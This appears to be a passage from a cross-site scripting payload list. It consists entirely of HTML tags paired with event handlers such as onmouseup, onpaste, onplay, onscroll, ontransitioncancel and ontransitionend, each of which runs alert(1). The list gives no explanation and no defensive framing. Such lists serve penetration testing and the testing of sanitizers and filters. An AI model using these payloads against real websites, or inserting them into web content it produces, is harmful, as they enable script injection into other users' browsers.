<ul onmouseover="alert(1)">test</ul>
<var onmouseover="alert(1)">test</var>
<video onmouseover="alert(1)">test</video>
<wbr onmouseover="alert(1)">test</wbr>
<xmp onmouseover="alert(1)">test</xmp>
<a onmouseup="alert(1)">test</a>
<abbr onmouseup="alert(1)">test</abbr>
<acronym onmouseup="alert(1)">test</acronym>
<address onmouseup="alert(1)">test</address>
<applet onmouseup="alert(1)">test</applet>
<area onmouseup="alert(1)">test</area>
<article onmouseup="alert(1)">test</article>
<aside onmouseup="alert(1)">test</aside>
<audio onmouseup="alert(1)">test</audio>
<b onmouseup="alert(1)">test</b>
<base onmouseup="alert(1)">test</base>
<basefont onmouseup="alert(1)">test</basefont>
<bdi onmouseup="alert(1)">test</bdi>
<bdo onmouseup="alert(1)">test</bdo>
<bgsound onmouseup="alert(1)">test</bgsound>
<big onmouseup="alert(1)">test</big>
<blink onmouseup="alert(1)">test</blink>
<blockquote onmouseup="alert(1)">test</blockquote>
<body onmouseup="alert(1)">test</body>
<br onmouseup="alert(1)">test</br>
<button onmouseup="alert(1)">test</button>
<canvas onmouseup="alert(1)">test</canvas>
<caption onmouseup="alert(1)">test</caption>
<center onmouseup="alert(1)">test</center>
<cite onmouseup="alert(1)">test</cite>
<code onmouseup="alert(1)">test</code>
<col onmouseup="alert(1)">test</col>
<colgroup onmouseup="alert(1)">test</colgroup>
<command onmouseup="alert(1)">test</command>
<content onmouseup="alert(1)">test</content>
<data onmouseup="alert(1)">test</data>
<datalist onmouseup="alert(1)">test</datalist>
<dd onmouseup="alert(1)">test</dd>
<del onmouseup="alert(1)">test</del>
<details onmouseup="alert(1)">test</details>
<dfn onmouseup="alert(1)">test</dfn>
<dialog onmouseup="alert(1)">test</dialog>
<dir onmouseup="alert(1)">test</dir>
<div onmouseup="alert(1)">test</div>
<dl onmouseup="alert(1)">test</dl>
<dt onmouseup="alert(1)">test</dt>
<element onmouseup="alert(1)">test</element>
<em onmouseup="alert(1)">test</em>
<embed onmouseup="alert(1)">test</embed>
<fieldset onmouseup="alert(1)">test</fieldset>
<figcaption onmouseup="alert(1)">test</figcaption>
<figure onmouseup="alert(1)">test</figure>
<font onmouseup="alert(1)">test</font>
<footer onmouseup="alert(1)">test</footer>
<form onmouseup="alert(1)">test</form>
<frame onmouseup="alert(1)">test</frame>
<frameset onmouseup="alert(1)">test</frameset>
<h1 onmouseup="alert(1)">test</h1>
<head onmouseup="alert(1)">test</head>
<header onmouseup="alert(1)">test</header>
<hgroup onmouseup="alert(1)">test</hgroup>
<hr onmouseup="alert(1)">test</hr>
<html onmouseup="alert(1)">test</html>
<i onmouseup="alert(1)">test</i>
<iframe onmouseup="alert(1)">test</iframe>
<image onmouseup="alert(1)">test</image>
<img onmouseup="alert(1)">test</img>
<input onmouseup="alert(1)">test</input>
<ins onmouseup="alert(1)">test</ins>
<isindex onmouseup="alert(1)">test</isindex>
<kbd onmouseup="alert(1)">test</kbd>
<keygen onmouseup="alert(1)">test</keygen>
<label onmouseup="alert(1)">test</label>
<legend onmouseup="alert(1)">test</legend>
<li onmouseup="alert(1)">test</li>
<link onmouseup="alert(1)">test</link>
<listing onmouseup="alert(1)">test</listing>
<main onmouseup="alert(1)">test</main>
<map onmouseup="alert(1)">test</map>
<mark onmouseup="alert(1)">test</mark>
<marquee onmouseup="alert(1)">test</marquee>
<menu onmouseup="alert(1)">test</menu>
<menuitem onmouseup="alert(1)">test</menuitem>
<meta onmouseup="alert(1)">test</meta>
<meter onmouseup="alert(1)">test</meter>
<multicol onmouseup="alert(1)">test</multicol>
<nav onmouseup="alert(1)">test</nav>
<nextid onmouseup="alert(1)">test</nextid>
<nobr onmouseup="alert(1)">test</nobr>
<noembed onmouseup="alert(1)">test</noembed>
<noframes onmouseup="alert(1)">test</noframes>
<noscript onmouseup="alert(1)">test</noscript>
<object onmouseup="alert(1)">test</object>
<ol onmouseup="alert(1)">test</ol>
<optgroup onmouseup="alert(1)">test</optgroup>
<option onmouseup="alert(1)">test</option>
<output onmouseup="alert(1)">test</output>
<p onmouseup="alert(1)">test</p>
<param onmouseup="alert(1)">test</param>
<picture onmouseup="alert(1)">test</picture>
<plaintext onmouseup="alert(1)">test</plaintext>
<pre onmouseup="alert(1)">test</pre>
<progress onmouseup="alert(1)">test</progress>
<q onmouseup="alert(1)">test</q>
<rb onmouseup="alert(1)">test</rb>
<rp onmouseup="alert(1)">test</rp>
<rt onmouseup="alert(1)">test</rt>
<rtc onmouseup="alert(1)">test</rtc>
<ruby onmouseup="alert(1)">test</ruby>
<s onmouseup="alert(1)">test</s>
<samp onmouseup="alert(1)">test</samp>
<script onmouseup="alert(1)">test</script>
<section onmouseup="alert(1)">test</section>
<select onmouseup="alert(1)">test</select>
<shadow onmouseup="alert(1)">test</shadow>
<slot onmouseup="alert(1)">test</slot>
<small onmouseup="alert(1)">test</small>
<source onmouseup="alert(1)">test</source>
<spacer onmouseup="alert(1)">test</spacer>
<span onmouseup="alert(1)">test</span>
<strike onmouseup="alert(1)">test</strike>
<strong onmouseup="alert(1)">test</strong>
<style onmouseup="alert(1)">test</style>
<sub onmouseup="alert(1)">test</sub>
<summary onmouseup="alert(1)">test</summary>
<sup onmouseup="alert(1)">test</sup>
<svg onmouseup="alert(1)">test</svg>
<table onmouseup="alert(1)">test</table>
<tbody onmouseup="alert(1)">test</tbody>
<td onmouseup="alert(1)">test</td>
<template onmouseup="alert(1)">test</template>
<textarea onmouseup="alert(1)">test</textarea>
<tfoot onmouseup="alert(1)">test</tfoot>
<th onmouseup="alert(1)">test</th>
<thead onmouseup="alert(1)">test</thead>
<time onmouseup="alert(1)">test</time>
<title onmouseup="alert(1)">test</title>
<tr onmouseup="alert(1)">test</tr>
<track onmouseup="alert(1)">test</track>
<tt onmouseup="alert(1)">test</tt>
<u onmouseup="alert(1)">test</u>
<ul onmouseup="alert(1)">test</ul>
<var onmouseup="alert(1)">test</var>
<video onmouseup="alert(1)">test</video>
<wbr onmouseup="alert(1)">test</wbr>
<xmp onmouseup="alert(1)">test</xmp>
<body onpageshow=alert(1)>
<input onpaste=alert(1) value="" autofocus>
<textarea onpaste=alert(1) autofocus></textarea>
<a onpaste="alert(1)" contenteditable>test</a>
<abbr onpaste="alert(1)" contenteditable>test</abbr>
<acronym onpaste="alert(1)" contenteditable>test</acronym>
<address onpaste="alert(1)" contenteditable>test</address>
<applet onpaste="alert(1)" contenteditable>test</applet>
<area onpaste="alert(1)" contenteditable>test</area>
<article onpaste="alert(1)" contenteditable>test</article>
<aside onpaste="alert(1)" contenteditable>test</aside>
<audio onpaste="alert(1)" contenteditable>test</audio>
<b onpaste="alert(1)" contenteditable>test</b>
<base onpaste="alert(1)" contenteditable>test</base>
<basefont onpaste="alert(1)" contenteditable>test</basefont>
<bdi onpaste="alert(1)" contenteditable>test</bdi>
<bdo onpaste="alert(1)" contenteditable>test</bdo>
<bgsound onpaste="alert(1)" contenteditable>test</bgsound>
<big onpaste="alert(1)" contenteditable>test</big>
<blink onpaste="alert(1)" contenteditable>test</blink>
<blockquote onpaste="alert(1)" contenteditable>test</blockquote>
<body onpaste="alert(1)" contenteditable>test</body>
<br onpaste="alert(1)" contenteditable>test</br>
<button onpaste="alert(1)" contenteditable>test</button>
<canvas onpaste="alert(1)" contenteditable>test</canvas>
<caption onpaste="alert(1)" contenteditable>test</caption>
<center onpaste="alert(1)" contenteditable>test</center>
<cite onpaste="alert(1)" contenteditable>test</cite>
<code onpaste="alert(1)" contenteditable>test</code>
<col onpaste="alert(1)" contenteditable>test</col>
<colgroup onpaste="alert(1)" contenteditable>test</colgroup>
<command onpaste="alert(1)" contenteditable>test</command>
<content onpaste="alert(1)" contenteditable>test</content>
<data onpaste="alert(1)" contenteditable>test</data>
<datalist onpaste="alert(1)" contenteditable>test</datalist>
<dd onpaste="alert(1)" contenteditable>test</dd>
<del onpaste="alert(1)" contenteditable>test</del>
<details onpaste="alert(1)" contenteditable>test</details>
<dfn onpaste="alert(1)" contenteditable>test</dfn>
<dialog onpaste="alert(1)" contenteditable>test</dialog>
<dir onpaste="alert(1)" contenteditable>test</dir>
<div onpaste="alert(1)" contenteditable>test</div>
<dl onpaste="alert(1)" contenteditable>test</dl>
<dt onpaste="alert(1)" contenteditable>test</dt>
<element onpaste="alert(1)" contenteditable>test</element>
<em onpaste="alert(1)" contenteditable>test</em>
<embed onpaste="alert(1)" contenteditable>test</embed>
<fieldset onpaste="alert(1)" contenteditable>test</fieldset>
<figcaption onpaste="alert(1)" contenteditable>test</figcaption>
<figure onpaste="alert(1)" contenteditable>test</figure>
<font onpaste="alert(1)" contenteditable>test</font>
<footer onpaste="alert(1)" contenteditable>test</footer>
<form onpaste="alert(1)" contenteditable>test</form>
<frame onpaste="alert(1)" contenteditable>test</frame>
<frameset onpaste="alert(1)" contenteditable>test</frameset>
<h1 onpaste="alert(1)" contenteditable>test</h1>
<head onpaste="alert(1)" contenteditable>test</head>
<header onpaste="alert(1)" contenteditable>test</header>
<hgroup onpaste="alert(1)" contenteditable>test</hgroup>
<hr onpaste="alert(1)" contenteditable>test</hr>
<html onpaste="alert(1)" contenteditable>test</html>
<i onpaste="alert(1)" contenteditable>test</i>
<iframe onpaste="alert(1)" contenteditable>test</iframe>
<image onpaste="alert(1)" contenteditable>test</image>
<img onpaste="alert(1)" contenteditable>test</img>
<ins onpaste="alert(1)" contenteditable>test</ins>
<isindex onpaste="alert(1)" contenteditable>test</isindex>
<kbd onpaste="alert(1)" contenteditable>test</kbd>
<keygen onpaste="alert(1)" contenteditable>test</keygen>
<label onpaste="alert(1)" contenteditable>test</label>
<legend onpaste="alert(1)" contenteditable>test</legend>
<li onpaste="alert(1)" contenteditable>test</li>
<link onpaste="alert(1)" contenteditable>test</link>
<listing onpaste="alert(1)" contenteditable>test</listing>
<main onpaste="alert(1)" contenteditable>test</main>
<map onpaste="alert(1)" contenteditable>test</map>
<mark onpaste="alert(1)" contenteditable>test</mark>
<marquee onpaste="alert(1)" contenteditable>test</marquee>
<menu onpaste="alert(1)" contenteditable>test</menu>
<menuitem onpaste="alert(1)" contenteditable>test</menuitem>
<meta onpaste="alert(1)" contenteditable>test</meta>
<meter onpaste="alert(1)" contenteditable>test</meter>
<multicol onpaste="alert(1)" contenteditable>test</multicol>
<nav onpaste="alert(1)" contenteditable>test</nav>
<nextid onpaste="alert(1)" contenteditable>test</nextid>
<nobr onpaste="alert(1)" contenteditable>test</nobr>
<noembed onpaste="alert(1)" contenteditable>test</noembed>
<noframes onpaste="alert(1)" contenteditable>test</noframes>
<noscript onpaste="alert(1)" contenteditable>test</noscript>
<object onpaste="alert(1)" contenteditable>test</object>
<ol onpaste="alert(1)" contenteditable>test</ol>
<optgroup onpaste="alert(1)" contenteditable>test</optgroup>
<option onpaste="alert(1)" contenteditable>test</option>
<output onpaste="alert(1)" contenteditable>test</output>
<p onpaste="alert(1)" contenteditable>test</p>
<param onpaste="alert(1)" contenteditable>test</param>
<picture onpaste="alert(1)" contenteditable>test</picture>
<plaintext onpaste="alert(1)" contenteditable>test</plaintext>
<pre onpaste="alert(1)" contenteditable>test</pre>
<progress onpaste="alert(1)" contenteditable>test</progress>
<q onpaste="alert(1)" contenteditable>test</q>
<rb onpaste="alert(1)" contenteditable>test</rb>
<rp onpaste="alert(1)" contenteditable>test</rp>
<rt onpaste="alert(1)" contenteditable>test</rt>
<rtc onpaste="alert(1)" contenteditable>test</rtc>
<ruby onpaste="alert(1)" contenteditable>test</ruby>
<s onpaste="alert(1)" contenteditable>test</s>
<samp onpaste="alert(1)" contenteditable>test</samp>
<script onpaste="alert(1)" contenteditable>test</script>
<section onpaste="alert(1)" contenteditable>test</section>
<select onpaste="alert(1)" contenteditable>test</select>
<shadow onpaste="alert(1)" contenteditable>test</shadow>
<slot onpaste="alert(1)" contenteditable>test</slot>
<small onpaste="alert(1)" contenteditable>test</small>
<source onpaste="alert(1)" contenteditable>test</source>
<spacer onpaste="alert(1)" contenteditable>test</spacer>
<span onpaste="alert(1)" contenteditable>test</span>
<strike onpaste="alert(1)" contenteditable>test</strike>
<strong onpaste="alert(1)" contenteditable>test</strong>
<style onpaste="alert(1)" contenteditable>test</style>
<sub onpaste="alert(1)" contenteditable>test</sub>
<summary onpaste="alert(1)" contenteditable>test</summary>
<sup onpaste="alert(1)" contenteditable>test</sup>
<svg onpaste="alert(1)" contenteditable>test</svg>
<table onpaste="alert(1)" contenteditable>test</table>
<tbody onpaste="alert(1)" contenteditable>test</tbody>
<td onpaste="alert(1)" contenteditable>test</td>
<template onpaste="alert(1)" contenteditable>test</template>
<tfoot onpaste="alert(1)" contenteditable>test</tfoot>
<th onpaste="alert(1)" contenteditable>test</th>
<thead onpaste="alert(1)" contenteditable>test</thead>
<time onpaste="alert(1)" contenteditable>test</time>
<title onpaste="alert(1)" contenteditable>test</title>
<tr onpaste="alert(1)" contenteditable>test</tr>
<track onpaste="alert(1)" contenteditable>test</track>
<tt onpaste="alert(1)" contenteditable>test</tt>
<u onpaste="alert(1)" contenteditable>test</u>
<ul onpaste="alert(1)" contenteditable>test</ul>
<var onpaste="alert(1)" contenteditable>test</var>
<video onpaste="alert(1)" contenteditable>test</video>
<wbr onpaste="alert(1)" contenteditable>test</wbr>
<xmp onpaste="alert(1)" contenteditable>test</xmp>
<video autoplay controls onpause=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<video autoplay onplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<video autoplay onplaying=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<body onpopstate=alert(1)>
<applet onreadystatechange=alert(1)></applet>
<iframe onreadystatechange=alert(1)></iframe>
<object data=/ onreadystatechange=alert(1)>
<link onreadystatechange=alert(1) rel=stylesheet href=1>
<script onreadystatechange=alert(1)></script>
<style onreadystatechange=alert(1)></style>
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
<svg><path><animateMotion onrepeat=alert(1) dur="1s" repeatCount="2">
<svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>
<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>
<form onreset=alert(1)><input type=reset>
<body onresize="alert(1)">
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
<form><input type=search onsearch=alert(1) value="Hit return" autofocus>
<audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<video autoplay controls onseeked=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<video autoplay controls onseeking=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<input onselect=alert(1) value="XSS" autofocus>
<textarea onselect=alert(1) autofocus>XSS</textarea>
<marquee onstart=alert(1)>XSS</marquee>
<form onsubmit=alert(1)><input type=submit>
<video controls autoplay ontimeupdate=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<style>:target {color: red;}</style><a id=x style="transition:color 10s" ontransitioncancel=alert(1)></a>
<style>:target {color: red;}</style><abbr id=x style="transition:color 10s" ontransitioncancel=alert(1)></abbr>
<style>:target {color: red;}</style><acronym id=x style="transition:color 10s" ontransitioncancel=alert(1)></acronym>
<style>:target {color: red;}</style><address id=x style="transition:color 10s" ontransitioncancel=alert(1)></address>
<style>:target {color: red;}</style><applet id=x style="transition:color 10s" ontransitioncancel=alert(1)></applet>
<style>:target {color: red;}</style><area id=x style="transition:color 10s" ontransitioncancel=alert(1)></area>
<style>:target {color: red;}</style><article id=x style="transition:color 10s" ontransitioncancel=alert(1)></article>
<style>:target {color: red;}</style><aside id=x style="transition:color 10s" ontransitioncancel=alert(1)></aside>
<style>:target {color: red;}</style><audio id=x style="transition:color 10s" ontransitioncancel=alert(1)></audio>
<style>:target {color: red;}</style><b id=x style="transition:color 10s" ontransitioncancel=alert(1)></b>
<style>:target {color: red;}</style><base id=x style="transition:color 10s" ontransitioncancel=alert(1)></base>
<style>:target {color: red;}</style><basefont id=x style="transition:color 10s" ontransitioncancel=alert(1)></basefont>
<style>:target {color: red;}</style><bdi id=x style="transition:color 10s" ontransitioncancel=alert(1)></bdi>
<style>:target {color: red;}</style><bdo id=x style="transition:color 10s" ontransitioncancel=alert(1)></bdo>
<style>:target {color: red;}</style><bgsound id=x style="transition:color 10s" ontransitioncancel=alert(1)></bgsound>
<style>:target {color: red;}</style><big id=x style="transition:color 10s" ontransitioncancel=alert(1)></big>
<style>:target {color: red;}</style><blink id=x style="transition:color 10s" ontransitioncancel=alert(1)></blink>
<style>:target {color: red;}</style><blockquote id=x style="transition:color 10s" ontransitioncancel=alert(1)></blockquote>
<style>:target {color: red;}</style><body id=x style="transition:color 10s" ontransitioncancel=alert(1)></body>
<style>:target {color: red;}</style><br id=x style="transition:color 10s" ontransitioncancel=alert(1)></br>
<style>:target {color: red;}</style><button id=x style="transition:color 10s" ontransitioncancel=alert(1)></button>
<style>:target {color: red;}</style><canvas id=x style="transition:color 10s" ontransitioncancel=alert(1)></canvas>
<style>:target {color: red;}</style><caption id=x style="transition:color 10s" ontransitioncancel=alert(1)></caption>
<style>:target {color: red;}</style><center id=x style="transition:color 10s" ontransitioncancel=alert(1)></center>
<style>:target {color: red;}</style><cite id=x style="transition:color 10s" ontransitioncancel=alert(1)></cite>
<style>:target {color: red;}</style><code id=x style="transition:color 10s" ontransitioncancel=alert(1)></code>
<style>:target {color: red;}</style><col id=x style="transition:color 10s" ontransitioncancel=alert(1)></col>
<style>:target {color: red;}</style><colgroup id=x style="transition:color 10s" ontransitioncancel=alert(1)></colgroup>
<style>:target {color: red;}</style><command id=x style="transition:color 10s" ontransitioncancel=alert(1)></command>
<style>:target {color: red;}</style><content id=x style="transition:color 10s" ontransitioncancel=alert(1)></content>
<style>:target {color: red;}</style><data id=x style="transition:color 10s" ontransitioncancel=alert(1)></data>
<style>:target {color: red;}</style><datalist id=x style="transition:color 10s" ontransitioncancel=alert(1)></datalist>
<style>:target {color: red;}</style><dd id=x style="transition:color 10s" ontransitioncancel=alert(1)></dd>
<style>:target {color: red;}</style><del id=x style="transition:color 10s" ontransitioncancel=alert(1)></del>
<style>:target {color: red;}</style><details id=x style="transition:color 10s" ontransitioncancel=alert(1)></details>
<style>:target {color: red;}</style><dfn id=x style="transition:color 10s" ontransitioncancel=alert(1)></dfn>
<style>:target {color: red;}</style><dialog id=x style="transition:color 10s" ontransitioncancel=alert(1)></dialog>
<style>:target {color: red;}</style><dir id=x style="transition:color 10s" ontransitioncancel=alert(1)></dir>
<style>:target {color: red;}</style><div id=x style="transition:color 10s" ontransitioncancel=alert(1)></div>
<style>:target {color: red;}</style><dl id=x style="transition:color 10s" ontransitioncancel=alert(1)></dl>
<style>:target {color: red;}</style><dt id=x style="transition:color 10s" ontransitioncancel=alert(1)></dt>
<style>:target {color: red;}</style><element id=x style="transition:color 10s" ontransitioncancel=alert(1)></element>
<style>:target {color: red;}</style><em id=x style="transition:color 10s" ontransitioncancel=alert(1)></em>
<style>:target {color: red;}</style><embed id=x style="transition:color 10s" ontransitioncancel=alert(1)></embed>
<style>:target {color: red;}</style><fieldset id=x style="transition:color 10s" ontransitioncancel=alert(1)></fieldset>
<style>:target {color: red;}</style><figcaption id=x style="transition:color 10s" ontransitioncancel=alert(1)></figcaption>
<style>:target {color: red;}</style><figure id=x style="transition:color 10s" ontransitioncancel=alert(1)></figure>
<style>:target {color: red;}</style><font id=x style="transition:color 10s" ontransitioncancel=alert(1)></font>
<style>:target {color: red;}</style><footer id=x style="transition:color 10s" ontransitioncancel=alert(1)></footer>
<style>:target {color: red;}</style><form id=x style="transition:color 10s" ontransitioncancel=alert(1)></form>
<style>:target {color: red;}</style><frame id=x style="transition:color 10s" ontransitioncancel=alert(1)></frame>
<style>:target {color: red;}</style><frameset id=x style="transition:color 10s" ontransitioncancel=alert(1)></frameset>
<style>:target {color: red;}</style><h1 id=x style="transition:color 10s" ontransitioncancel=alert(1)></h1>
<style>:target {color: red;}</style><head id=x style="transition:color 10s" ontransitioncancel=alert(1)></head>
<style>:target {color: red;}</style><header id=x style="transition:color 10s" ontransitioncancel=alert(1)></header>
<style>:target {color: red;}</style><hgroup id=x style="transition:color 10s" ontransitioncancel=alert(1)></hgroup>
<style>:target {color: red;}</style><hr id=x style="transition:color 10s" ontransitioncancel=alert(1)></hr>
<style>:target {color: red;}</style><html id=x style="transition:color 10s" ontransitioncancel=alert(1)></html>
<style>:target {color: red;}</style><i id=x style="transition:color 10s" ontransitioncancel=alert(1)></i>
<style>:target {color: red;}</style><iframe id=x style="transition:color 10s" ontransitioncancel=alert(1)></iframe>
<style>:target {color: red;}</style><image id=x style="transition:color 10s" ontransitioncancel=alert(1)></image>
<style>:target {color: red;}</style><img id=x style="transition:color 10s" ontransitioncancel=alert(1)></img>
<style>:target {color: red;}</style><input id=x style="transition:color 10s" ontransitioncancel=alert(1)></input>
<style>:target {color: red;}</style><ins id=x style="transition:color 10s" ontransitioncancel=alert(1)></ins>
<style>:target {color: red;}</style><isindex id=x style="transition:color 10s" ontransitioncancel=alert(1)></isindex>
<style>:target {color: red;}</style><kbd id=x style="transition:color 10s" ontransitioncancel=alert(1)></kbd>
<style>:target {color: red;}</style><keygen id=x style="transition:color 10s" ontransitioncancel=alert(1)></keygen>
<style>:target {color: red;}</style><label id=x style="transition:color 10s" ontransitioncancel=alert(1)></label>
<style>:target {color: red;}</style><legend id=x style="transition:color 10s" ontransitioncancel=alert(1)></legend>
<style>:target {color: red;}</style><li id=x style="transition:color 10s" ontransitioncancel=alert(1)></li>
<style>:target {color: red;}</style><link id=x style="transition:color 10s" ontransitioncancel=alert(1)></link>
<style>:target {color: red;}</style><listing id=x style="transition:color 10s" ontransitioncancel=alert(1)></listing>
<style>:target {color: red;}</style><main id=x style="transition:color 10s" ontransitioncancel=alert(1)></main>
<style>:target {color: red;}</style><map id=x style="transition:color 10s" ontransitioncancel=alert(1)></map>
<style>:target {color: red;}</style><mark id=x style="transition:color 10s" ontransitioncancel=alert(1)></mark>
<style>:target {color: red;}</style><marquee id=x style="transition:color 10s" ontransitioncancel=alert(1)></marquee>
<style>:target {color: red;}</style><menu id=x style="transition:color 10s" ontransitioncancel=alert(1)></menu>
<style>:target {color: red;}</style><menuitem id=x style="transition:color 10s" ontransitioncancel=alert(1)></menuitem>
<style>:target {color: red;}</style><meta id=x style="transition:color 10s" ontransitioncancel=alert(1)></meta>
<style>:target {color: red;}</style><meter id=x style="transition:color 10s" ontransitioncancel=alert(1)></meter>
<style>:target {color: red;}</style><multicol id=x style="transition:color 10s" ontransitioncancel=alert(1)></multicol>
<style>:target {color: red;}</style><nav id=x style="transition:color 10s" ontransitioncancel=alert(1)></nav>
<style>:target {color: red;}</style><nextid id=x style="transition:color 10s" ontransitioncancel=alert(1)></nextid>
<style>:target {color: red;}</style><nobr id=x style="transition:color 10s" ontransitioncancel=alert(1)></nobr>
<style>:target {color: red;}</style><noembed id=x style="transition:color 10s" ontransitioncancel=alert(1)></noembed>
<style>:target {color: red;}</style><noframes id=x style="transition:color 10s" ontransitioncancel=alert(1)></noframes>
<style>:target {color: red;}</style><noscript id=x style="transition:color 10s" ontransitioncancel=alert(1)></noscript>
<style>:target {color: red;}</style><object id=x style="transition:color 10s" ontransitioncancel=alert(1)></object>
<style>:target {color: red;}</style><ol id=x style="transition:color 10s" ontransitioncancel=alert(1)></ol>
<style>:target {color: red;}</style><optgroup id=x style="transition:color 10s" ontransitioncancel=alert(1)></optgroup>
<style>:target {color: red;}</style><option id=x style="transition:color 10s" ontransitioncancel=alert(1)></option>
<style>:target {color: red;}</style><output id=x style="transition:color 10s" ontransitioncancel=alert(1)></output>
<style>:target {color: red;}</style><p id=x style="transition:color 10s" ontransitioncancel=alert(1)></p>
<style>:target {color: red;}</style><param id=x style="transition:color 10s" ontransitioncancel=alert(1)></param>
<style>:target {color: red;}</style><picture id=x style="transition:color 10s" ontransitioncancel=alert(1)></picture>
<style>:target {color: red;}</style><plaintext id=x style="transition:color 10s" ontransitioncancel=alert(1)></plaintext>
<style>:target {color: red;}</style><pre id=x style="transition:color 10s" ontransitioncancel=alert(1)></pre>
<style>:target {color: red;}</style><progress id=x style="transition:color 10s" ontransitioncancel=alert(1)></progress>
<style>:target {color: red;}</style><q id=x style="transition:color 10s" ontransitioncancel=alert(1)></q>
<style>:target {color: red;}</style><rb id=x style="transition:color 10s" ontransitioncancel=alert(1)></rb>
<style>:target {color: red;}</style><rp id=x style="transition:color 10s" ontransitioncancel=alert(1)></rp>
<style>:target {color: red;}</style><rt id=x style="transition:color 10s" ontransitioncancel=alert(1)></rt>
<style>:target {color: red;}</style><rtc id=x style="transition:color 10s" ontransitioncancel=alert(1)></rtc>
<style>:target {color: red;}</style><ruby id=x style="transition:color 10s" ontransitioncancel=alert(1)></ruby>
<style>:target {color: red;}</style><s id=x style="transition:color 10s" ontransitioncancel=alert(1)></s>
<style>:target {color: red;}</style><samp id=x style="transition:color 10s" ontransitioncancel=alert(1)></samp>
<style>:target {color: red;}</style><script id=x style="transition:color 10s" ontransitioncancel=alert(1)></script>
<style>:target {color: red;}</style><section id=x style="transition:color 10s" ontransitioncancel=alert(1)></section>
<style>:target {color: red;}</style><select id=x style="transition:color 10s" ontransitioncancel=alert(1)></select>
<style>:target {color: red;}</style><shadow id=x style="transition:color 10s" ontransitioncancel=alert(1)></shadow>
<style>:target {color: red;}</style><slot id=x style="transition:color 10s" ontransitioncancel=alert(1)></slot>
<style>:target {color: red;}</style><small id=x style="transition:color 10s" ontransitioncancel=alert(1)></small>
<style>:target {color: red;}</style><source id=x style="transition:color 10s" ontransitioncancel=alert(1)></source>
<style>:target {color: red;}</style><spacer id=x style="transition:color 10s" ontransitioncancel=alert(1)></spacer>
<style>:target {color: red;}</style><span id=x style="transition:color 10s" ontransitioncancel=alert(1)></span>
<style>:target {color: red;}</style><strike id=x style="transition:color 10s" ontransitioncancel=alert(1)></strike>
<style>:target {color: red;}</style><strong id=x style="transition:color 10s" ontransitioncancel=alert(1)></strong>
<style>:target {color: red;}</style><style id=x style="transition:color 10s" ontransitioncancel=alert(1)></style>
<style>:target {color: red;}</style><sub id=x style="transition:color 10s" ontransitioncancel=alert(1)></sub>
<style>:target {color: red;}</style><summary id=x style="transition:color 10s" ontransitioncancel=alert(1)></summary>
<style>:target {color: red;}</style><sup id=x style="transition:color 10s" ontransitioncancel=alert(1)></sup>
<style>:target {color: red;}</style><svg id=x style="transition:color 10s" ontransitioncancel=alert(1)></svg>
<style>:target {color: red;}</style><table id=x style="transition:color 10s" ontransitioncancel=alert(1)></table>
<style>:target {color: red;}</style><tbody id=x style="transition:color 10s" ontransitioncancel=alert(1)></tbody>
<style>:target {color: red;}</style><td id=x style="transition:color 10s" ontransitioncancel=alert(1)></td>
<style>:target {color: red;}</style><template id=x style="transition:color 10s" ontransitioncancel=alert(1)></template>
<style>:target {color: red;}</style><textarea id=x style="transition:color 10s" ontransitioncancel=alert(1)></textarea>
<style>:target {color: red;}</style><tfoot id=x style="transition:color 10s" ontransitioncancel=alert(1)></tfoot>
<style>:target {color: red;}</style><th id=x style="transition:color 10s" ontransitioncancel=alert(1)></th>
<style>:target {color: red;}</style><thead id=x style="transition:color 10s" ontransitioncancel=alert(1)></thead>
<style>:target {color: red;}</style><time id=x style="transition:color 10s" ontransitioncancel=alert(1)></time>
<style>:target {color: red;}</style><title id=x style="transition:color 10s" ontransitioncancel=alert(1)></title>
<style>:target {color: red;}</style><tr id=x style="transition:color 10s" ontransitioncancel=alert(1)></tr>
<style>:target {color: red;}</style><track id=x style="transition:color 10s" ontransitioncancel=alert(1)></track>
<style>:target {color: red;}</style><tt id=x style="transition:color 10s" ontransitioncancel=alert(1)></tt>
<style>:target {color: red;}</style><u id=x style="transition:color 10s" ontransitioncancel=alert(1)></u>
<style>:target {color: red;}</style><ul id=x style="transition:color 10s" ontransitioncancel=alert(1)></ul>
<style>:target {color: red;}</style><var id=x style="transition:color 10s" ontransitioncancel=alert(1)></var>
<style>:target {color: red;}</style><video id=x style="transition:color 10s" ontransitioncancel=alert(1)></video>
<style>:target {color: red;}</style><wbr id=x style="transition:color 10s" ontransitioncancel=alert(1)></wbr>
<style>:target {color: red;}</style><xmp id=x style="transition:color 10s" ontransitioncancel=alert(1)></xmp>
<style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 10s" ontransitioncancel=alert(1)></xss>
<style>:target {color:red;}</style><a id=x style="transition:color 1s" ontransitionend=alert(1)></a>
<style>:target {color:red;}</style><abbr id=x style="transition:color 1s" ontransitionend=alert(1)></abbr>
<style>:target {color:red;}</style><acronym id=x style="transition:color 1s" ontransitionend=alert(1)></acronym>
<style>:target {color:red;}</style><address id=x style="transition:color 1s" ontransitionend=alert(1)></address>
<style>:target {color:red;}</style><applet id=x style="transition:color 1s" ontransitionend=alert(1)></applet>
<style>:target {color:red;}</style><area id=x style="transition:color 1s" ontransitionend=alert(1)></area>
<style>:target {color:red;}</style><article id=x style="transition:color 1s" ontransitionend=alert(1)></article>
<style>:target {color:red;}</style><aside id=x style="transition:color 1s" ontransitionend=alert(1)></aside>
<style>:target {color:red;}</style><audio id=x style="transition:color 1s" ontransitionend=alert(1)></audio>
<style>:target {color:red;}</style><b id=x style="transition:color 1s" ontransitionend=alert(1)></b>
